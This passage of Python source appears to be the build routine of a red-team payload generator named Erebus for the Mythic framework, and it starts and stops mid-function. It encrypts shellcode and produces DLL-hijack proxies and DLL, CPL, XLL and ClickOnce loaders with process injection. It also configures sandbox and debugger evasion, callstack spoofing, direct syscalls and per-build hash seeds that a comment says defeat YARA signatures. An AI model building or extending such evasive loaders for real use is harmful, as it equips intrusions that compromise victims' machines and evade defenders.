                        encryption_key=self.get_parameter("2.2 Encryption Key"),
                    )
                    shellcode_src = subprocess.check_output(key_cmd, text=True)
                    _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
                    if _key_parsed is not None:
                        encryption_key_bytes = _key_parsed
                    if _iv_parsed is not None:
                        encryption_iv_bytes = _iv_parsed
                except Exception as e:
                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"

                # Copy the obfuscated shellcode file over to the shellcode.hpp file
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied C shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))

                if self.get_parameter("0.9h XLL Payload Type") == "XLL Add-In DLL":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(xll_shellcode_path))

                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                    # Raw format: re-run shellcrypt in C mode and slice the
                    # `unsigned char key[] = {...};` declaration out of
                    # stdout so the loader can compile it in directly.
                    cmd = build_raw_key_cmd(
                        shellcrypt_path,
                        mythic_shellcode_path,
                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        encryption_key=self.get_parameter("2.2 Encryption Key"),
                    )
                    shellcode_src = subprocess.check_output(cmd, text=True)
                    output += shellcode_src
                    key_array = extract_raw_key_array(shellcode_src)
                    output += key_array
                    with open(encrypted_shellcode_path_sc, "w") as file:
                        file.write(key_array)

                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)

            elif process.returncode != 0:
                response.payload = b""
                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response

            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""
            ######################### End of Shellcode Obfuscation Section #########################

            ######################### Payload Build Section #########################
            # Determine payload type and configure accordingly
            payload_type = self.get_parameter("0.0 Main Payload Type")
            dll_file_name = None  # Used to store DLL filename for final payload naming
            print(f'User Selected: {payload_type}')

            if payload_type == "Hijack":
                # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success and len(file_name_resp.Files) > 0:
                    dll_file_name = file_name_resp.Files[0].Filename
                if not dll_file_name:
                    dll_file_name = f"{self.get_parameter('1.0 DLL Hijacking')}.dll"

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                # [DLL HIJACK SPECIFIC] Generate proxy exports
                exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)
                output += f"[DEBUG] Generated exports ({len(exports) if exports else 0} chars):\n{exports[:500] if exports else 'None'}\n"

                exports_list = {"EXPORTS": exports}
                proxy_template = environment.get_template("proxy.def")
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Validate proxy.def was generated with actual exports
                if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
                    await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.", success=False)
                    return response

                shutil.copy(src=dll_exports_path, dst=loader_exports_path)

                # Copy the original DLL into the payload directory as <name>_orig.dll
                # so the forwarder chain resolves correctly at runtime
                orig_dll_name = f"{Path(dll_file_name).stem}_orig{Path(dll_file_name).suffix}"
                orig_dll_path = Path(agent_build_path) / "payload" / orig_dll_name
                with open(str(orig_dll_path), "wb") as f:
                    f.write(file_content)

                response.status = BuildStatus.Success
                response.build_message = "DLL Proxied! Compiling Payload..."
                await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", "DLL Proxied! Compiling Payload...", success=True)

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                src=obfuscated_shellcode_path)

                    # ===== Configure Shellcode Loader config.hpp =====
                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                    config_hpp_destination = str(config_hpp_destination)

                    try:
                        # Load and render the config template
                        config_template = environment.get_template("config.hpp")
                        # Escape backslashes for C++ wide string literal
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Guardrails configuration for Shellcode Loader
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0

                        # Parse the list-based guardrail parameters and
                        # thread them into config.hpp. These render as
                        # XOR-encrypted byte arrays inside the generated
                        # DecryptGuardrailLists()/GetGuardrailConfig()
                        # helpers (see collect_guardrail_gr_lists + the
                        # config.hpp template for the decryption flow).
                        gr_block = collect_guardrail_gr_lists(
                            self,
                            bool(guardrails_enabled),
                            {
                                "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
                                "GUARDRAIL_BLOCKED_HOSTNAMES": "0.5h Block Analysis Hostnames",
                                "GUARDRAIL_BLOCKED_USERNAMES": "0.5i Block Analysis Usernames",
                                "GUARDRAIL_ALLOWED_IPS":       "0.5j IP Whitelist",
                                "GUARDRAIL_BLOCKED_IPS":       "0.5k IP Blacklist",
                                "GUARDRAIL_ALLOWED_DOMAINS":   "0.5l Domain Whitelist",
                            },
                        )

                        # R2b: config_data dict construction lives in
                        # plugin_loader_config (pure helper). Template
                        # render + disk write remain here because they're
                        # bound to the Jinja env + destination path.
                        config_data = build_loader_config_data(
                            target_process=target_process,
                            injection_type=self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                            compression_type_value=compression_type_value,
                            encoding_type_value=encoding_type_value,
                            encryption_type_value=encryption_type_value,
                            encryption_key_bytes=encryption_key_bytes,
                            encryption_iv_bytes=encryption_iv_bytes,
                            guardrails_enabled=guardrails_enabled,
                            guardrails_check_debugger=guardrails_check_debugger,
                            guardrails_check_remote_debugger=guardrails_check_remote,
                            guardrails_check_debugger_processes=guardrails_check_processes,
                            guardrails_check_hardware_breakpoints=guardrails_check_hwbp,
                            guardrails_check_timing=guardrails_check_timing,
                            guardrails_check_sandbox=guardrails_check_sandbox,
                            guardrails_decoy_file="decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
                            gr_block=gr_block,
                            syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
                            callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                            callstack_spoof_modules=(
                                parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                            ),
                        )
                        rendered_config = config_template.render(**config_data)

                        # Write the rendered config to the destination
                        with open(config_hpp_destination, "w") as config_file:
                            config_file.write(rendered_config)

                        response.status = BuildStatus.Success
                        response.build_message = "Shellcode Loader config generated!"
                        await self._build_step("[T1036] - Configuring Shellcode Loader", "Generated config.hpp with user-defined injection parameters", success=True)
                    except Exception as e:
                        await self._fail_step(response, "[T1036] - Configuring Shellcode Loader",
                            f"Failed to render Shellcode Loader config: {str(e)}",
                            f"Failed to render config.hpp: {str(e)}")
                        return response

                elif loader_type == "ClickOnce":
                    # ===== Configure ClickOnce InjectionConfig.cs =====
                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                    injection_config_destination = str(injection_config_destination)

                    try:
                        encryption_key_bytes_clickonce = ""
                        encrypted_shellcode_bytes_clickonce = ""
                        if os.path.exists(encrypted_shellcode_path_sc):
                            try:
                                with open(encrypted_shellcode_path_sc, "r") as combined_file:
                                    combined_content = combined_file.read()
                                    output += f"[DEBUG] File read from: {encrypted_shellcode_path_sc}\n"
                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                    import re

                                    # Extract key array bytes - handles both C++ and C# formats
                                    # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                    key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if key_match:
                                        key_section = key_match.group(1)
                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                        if hex_key:
                                            encryption_key_bytes_clickonce = ", ".join(hex_key)
                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes_clickonce}\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Key array not found in file\n"

                                    # Extract shellcode array bytes - handles both C++ and C# formats
                                    # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                    shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if shellcode_match:
                                        shellcode_section = shellcode_match.group(1)
                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                        if hex_shellcode:
                                            encrypted_shellcode_bytes_clickonce = ", ".join(hex_shellcode)
                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Shellcode array not found in file\n"

                            except Exception as extract_error:
                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                        else:
                            output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"

                        injection_config_template = environment.get_template("InjectionConfig.cs")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Guardrails configuration for ClickOnce
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0

                        injection_config_data = {
                            "COMPRESSION_TYPE": compression_type_value,
                            "ENCODING_TYPE": encoding_type_value,
                            "ENCRYPTION_TYPE": encryption_type_value,
                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                            "ENCRYPTION_KEY": encryption_key_bytes_clickonce,
                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes_clickonce,
                            "GUARDRAILS_ENABLED": "true" if guardrails_enabled else "false",
                            "DEBUG_LOGGING_ENABLED": "false",  # never ship debug logging; operator can manually flip in InjectionConfig.cs for testing
                            "GUARDRAILS_CHECK_DEBUGGER": "true" if guardrails_check_debugger else "false",
                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": "true" if guardrails_check_remote else "false",
                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": "true" if guardrails_check_processes else "false",
                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": "true" if guardrails_check_hwbp else "false",
                            "GUARDRAILS_CHECK_TIMING": "true" if guardrails_check_timing else "false",
                            "GUARDRAILS_CHECK_SANDBOX": "true" if guardrails_check_sandbox else "false",
                            "BLOCKED_PROCESSES": array_to_csharp_string(DEFAULT_BLOCKED_PROCESSES),
                            "ALLOWED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_USERNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5j IP Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5k IP Blacklist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_DOMAINS": array_to_csharp_string(parse_csv(self.get_parameter("0.5l Domain Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                        }
                        rendered_injection_config = injection_config_template.render(**injection_config_data)

                        with open(injection_config_destination, "w") as config_file:
                            config_file.write(rendered_injection_config)

                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce config generated!"
                        await self._build_step("[T1204.002] - Configuring ClickOnce Loader", "Generated InjectionConfig.cs with user-defined injection parameters", success=True)
                    except Exception as e:
                        await self._fail_step(response, "[T1204.002] - Configuring ClickOnce Loader",
                            f"Failed to render ClickOnce config: {str(e)}",
                            f"Failed to render InjectionConfig.cs: {str(e)}")
                        return response

            # ===== Configure & Compile Payload (Unified for all types) =====
            # Configure guadrails if applicable
            if payload_type == "Hijack":
                guardrail_template = environment.get_template("guardrail.hpp")
                guardrails_enabled = self.get_parameter("1.1 Use Built-in Guardrails")
                guardrail_data = {
                    "use_builtin_guardrails": guardrails_enabled,
                    "check_debugger": self.get_parameter("1.1a Check IsDebuggerPresent") if guardrails_enabled else False,
                    "check_remote_debugger": self.get_parameter("1.1b Check Remote Debugger") if guardrails_enabled else False,
                    "check_debugger_processes": self.get_parameter("1.1c Check Debugger Processes") if guardrails_enabled else False,
                    "check_hardware_breakpoints": self.get_parameter("1.1d Check Hardware Breakpoints") if guardrails_enabled else False,
                    "check_timing": self.get_parameter("1.1e Check Timing Anomalies") if guardrails_enabled else False,
                    "allowed_hostnames": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
                    "blocked_hostnames": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
                    "blocked_usernames": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
                    "allowed_ips": parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
                    "blocked_ips": parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
                    "allowed_domains": parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
                }
                guardrail_output = guardrail_template.render(**guardrail_data)
                guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                with open(str(guardrail_hpp_path), "w") as file:
                    file.write(guardrail_output)

                # Render config.hpp for Hijack build so encryption/compression settings take effect
                try:
                    config_template = environment.get_template("config.hpp")
                    compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                    encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                    gr_block_hijack = collect_guardrail_gr_lists(
                        self,
                        bool(guardrails_enabled),
                        {
                            "GUARDRAIL_ALLOWED_HOSTNAMES": "1.1f Hostname Whitelist",
                            "GUARDRAIL_BLOCKED_HOSTNAMES": "1.1g Block Analysis Hostnames",
                            "GUARDRAIL_BLOCKED_USERNAMES": "1.1h Block Analysis Usernames",
                            "GUARDRAIL_ALLOWED_IPS":       "1.1i IP Whitelist",
                            "GUARDRAIL_BLOCKED_IPS":       "1.1j IP Blacklist",
                            "GUARDRAIL_ALLOWED_DOMAINS":   "1.1k Domain Whitelist",
                        },
                    )
                    # R2b: shared config_data builder. Hijack hardcodes
                    # INJECTION_TYPE=2 (CreateFiber) because the DLL
                    # already runs in the hijacked process, and uses the
                    # 1.1* parameter namespace for guardrail toggles.
                    config_data = build_loader_config_data(
                        target_process="",
                        injection_type=2,
                        compression_type_value=compression_type_value,
                        encoding_type_value=encoding_type_value,
                        encryption_type_value=encryption_type_value,
                        encryption_key_bytes=encryption_key_bytes,
                        encryption_iv_bytes=encryption_iv_bytes,
                        guardrails_enabled=1 if guardrails_enabled else 0,
                        guardrails_check_debugger=1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
                        guardrails_check_remote_debugger=1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
                        guardrails_check_debugger_processes=1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
                        guardrails_check_hardware_breakpoints=1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
                        guardrails_check_timing=1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
                        guardrails_check_sandbox=0,
                        guardrails_decoy_file="",
                        gr_block=gr_block_hijack,
                        syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
                        callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                        callstack_spoof_modules=(
                            parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                            or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                        ),
                    )
                    rendered_config = config_template.render(**config_data)
                    config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
                    with open(config_hpp_destination, "w") as config_file:
                        config_file.write(rendered_config)
                    await self._build_step("[T1036] - Configuring DLL Hijack Loader", 
                                           "Generated config.hpp with encryption/compression settings", 
                                           success=True)
                except Exception as e:
                    await self._fail_step(response, "[T1036] - Configuring DLL Hijack Loader",
                        f"Failed to render Hijack config: {str(e)}",
                        f"Failed to render config.hpp: {str(e)}")
                    return response

                # DLL Hijack compilation.
                # EREBUS_HASH_SEED is a per-build random 32-bit constant that
                # reseeds the compile-time API hash function, so every built
                # loader has unique hash values for GetProcAddress targets.
                # Defeats family-level YARA pinned on fixed hash constants.
                _hash_seed = f"0x{secrets.randbits(32):08X}"
                _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
                _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                cmd = [
                    "make",
                    "-C",
                    shellcode_loader_path,
                    f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                    f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                    "TARGET=dll",
                    f"EREBUS_HASH_SEED={_hash_seed}",
                    f"CONFIG_SYSCALL_BACKEND={_sw3}",
                    f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                    "all"
                ]
                compile_step_name = "[T1027.011] - Compiling DLL Payload"
                compile_step_msg = "DLL Loader Compiled!"
                payload_output_file = f"{shellcode_loader_path}/erebus.dll"
                payload_final_name = dll_file_name  # Use the actual DLL filename

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    # Configure guardrails for Shellcode Loader
                    guardrail_template = environment.get_template("guardrail.hpp")
                    guardrails_enabled = self.get_parameter("0.5a Enable Guardrails")
                    guardrail_data = {
                        "use_builtin_guardrails": guardrails_enabled,
                        "check_debugger": self.get_parameter("0.5b Check IsDebuggerPresent") if guardrails_enabled else False,
                        "check_remote_debugger": self.get_parameter("0.5c Check Remote Debugger") if guardrails_enabled else False,
                        "check_debugger_processes": self.get_parameter("0.5d Check Debugger Processes") if guardrails_enabled else False,
                        "check_hardware_breakpoints": self.get_parameter("0.5e Check Hardware Breakpoints") if guardrails_enabled else False,
                        "check_timing": self.get_parameter("0.5f Check Timing Anomalies") if guardrails_enabled else False,
                        "allowed_hostnames": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
                        "blocked_hostnames": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
                        "blocked_usernames": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
                        "allowed_ips": parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
                        "blocked_ips": parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
                        "allowed_domains": parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
                    }
                    guardrail_output = guardrail_template.render(**guardrail_data)
                    guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                    with open(str(guardrail_hpp_path), "w") as file:
                        file.write(guardrail_output)

                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build configuration
                    if build_config == "test":
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            "test-all-payloads"
                        ]
                        compile_step_name = "[T1027] - Compiling Test Payloads"
                        compile_step_msg = "All test payloads compiled!"
                        # For test builds, we'll zip all payloads from the payloads directory
                        payload_output_file = f"{shellcode_loader_path}/payloads"
                        payload_final_name = "test_payloads.zip"
                    else:
                        loader_format = self.get_parameter('0.2 Loader Format')
                        _hash_seed = f"0x{secrets.randbits(32):08X}"
                        _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
                        _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
                            f"TARGET={loader_format}",
                            f"BUILD={build_config}",
                            f"EREBUS_HASH_SEED={_hash_seed}",
                            f"CONFIG_SYSCALL_BACKEND={_sw3}",
                            f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                            "all"
                        ]
                        if loader_format == "dll":
                            compile_step_name = "[T1027.011] - Compiling DLL Payload"
                            compile_step_msg = "DLL Loader Compiled!"
                        elif loader_format == "cpl":
                            compile_step_name = "[T1218.002] - Compiling CPL Payload"
                            compile_step_msg = "CPL Loader Compiled!"
                        elif loader_format == "xll":
                            compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                            compile_step_msg = "XLL Add-In Compiled!"
                        else:
                            compile_step_name = "[T1027] - Compiling Shellcode Loader"
                            compile_step_msg = "Shellcode Loader Compiled!"
                        payload_output_file = f"{shellcode_loader_path}/erebus.{loader_format}"
                        payload_final_name = f"erebus.{loader_format}"

                elif loader_type == "ClickOnce":
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    arch = self.get_parameter('0.3a ClickOnce Architecture') or "x64"
                    rid = f"win-{arch}"

                    cmd = [
                        "make",
                        "-C",
                        clickonce_loader_path,
                        f"CONFIG={build_config}",
                        f"RID={rid}",
                        "publish"
                    ]
                    compile_step_name = "[T1027] - Compiling ClickOnce Loader"
                    compile_step_msg = "ClickOnce Loader Compiled!"
                    payload_output_file = None  # Will be determined from publish directory
                    payload_final_name = "erebus.exe"

            # Execute compilation
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode(errors='replace')}"
            if stderr:
                output += f"[stderr]\n{stderr.decode(errors='replace')}"

            # Handle compilation output
            if payload_type == "Hijack":
                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                payload_path = str(payload_path)
                shutil.copy(dst=payload_path, src=payload_output_file)

                # Skip PE sanitize + self-hunt on debug builds - see
                # _finalize_pe_artifact for the rationale.
                _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
                output += _finalize_pe_artifact(
                    payload_path,
                    str(PurePath(agent_build_path) / "payload"),
                    build_config=_hijack_build_config,
                )

                if os.path.exists(payload_path):
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    await self._build_step(compile_step_name, compile_step_msg, success=True)
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
                    return response

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build - create zip of all test payloads
                    if build_config == "test":
                        payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory

                        output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
                        output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"

                        if payloads_dir.exists():
                            files_in_dir = list(payloads_dir.iterdir())
                            output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"

                        if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile test payloads"
                            response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
                            await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
                            return response

                        # Create agent_code/payloads directory for persistent storage
                        agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
                        agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)

                        # Create zip file using shutil
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        zip_basename = f"test_payloads_{timestamp}"

                        # Use shutil.make_archive to create zip (it adds .zip automatically)
                        # This creates the zip in the parent directory of payloads_dir
                        zip_archive_path = shutil.make_archive(
                            base_name=str(payloads_dir.parent / zip_basename),
                            format='zip',
                            root_dir=str(payloads_dir.parent),
                            base_dir=payloads_dir.name
                        )

                        output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
                        output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"

                        # Move the zip to agent_code/payloads
                        final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
                        shutil.move(zip_archive_path, str(final_zip_path))

                        output += f"[DEBUG] Moved archive to: {final_zip_path}\n"

                        # Also copy individual payloads to agent_code/payloads for easy access
                        files_copied = 0
                        for file in payloads_dir.iterdir():
                            if file.is_file():
                                shutil.copy(file, agent_code_payloads_dir / file.name)
                                files_copied += 1

                        output += f"[DEBUG] Copied {files_copied} individual files\n"

                        if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
                            response.status = BuildStatus.Success
                            response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
                            response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
                            await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)

                            # For test builds, read the zip and return it as the payload
                            with open(final_zip_path, "rb") as f:
                                response.payload = f.read()
                            response.updated_filename = f"{zip_basename}.zip"

                            # Return early for test builds - skip containerization and other steps
                            return response
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = f"Failed to create test payload zip"
                            response.build_stderr = output + "\n" + str(final_zip_path)
                            await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
                            return response
                    else:
                        payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                        payload_path = str(payload_path)
                        shutil.copy(dst=payload_path, src=payload_output_file)

                        # build_config was resolved at the top of this
                        # branch (Shellcode Loader, non-test). Threaded
                        # into the finalizer so debug builds skip the
                        # sanitizer/self_hunt pair.
                        output += _finalize_pe_artifact(
                            payload_path,
